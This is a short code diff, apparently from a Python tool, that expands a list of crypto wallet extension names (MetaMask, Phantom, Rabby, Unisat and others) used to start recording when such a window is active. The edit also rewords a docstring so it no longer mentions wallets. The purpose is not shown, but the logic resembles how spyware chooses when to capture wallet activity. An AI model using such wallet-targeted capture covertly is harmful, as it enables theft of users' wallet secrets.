@@ -22,8 +22,8 @@ BROWSER_PATTERNS = [
 _BROWSER_PATTERNS_LOWER = [p.lower() for p in BROWSER_PATTERNS]
 
 EXTENSION_PATTERNS = [
-    "OKX", "MetaMask", "Wallet", "Phantom", "Rainbow",
-    "Coinbase", "Trust Wallet", "Binance", "Exodus",
+    "OKX", "MetaMask", "Wallet", "Phantom", "Unisat", "Backpack",
+    "Coinbase", "Trust Wallet", "Binance", "Rabby",
     "Extension", "Chrome Extension", "Add-on", "Plugin",
     "Chrome Web Store", "Extension Settings",
 ]
@@ -39,7 +39,7 @@ CHECK_INTERVAL = 0.2
 
 
 def should_trigger_recording(window_name: Optional[str] = None) -> bool:
-    """判断当前窗口是否应该触发记录（Unknown 或包含钱包关键词）"""
+    """判断当前窗口是否应该触发记录（Unknown 或包含关键词）"""
     if window_name is None:
         window_name = get_active_window_name()
 
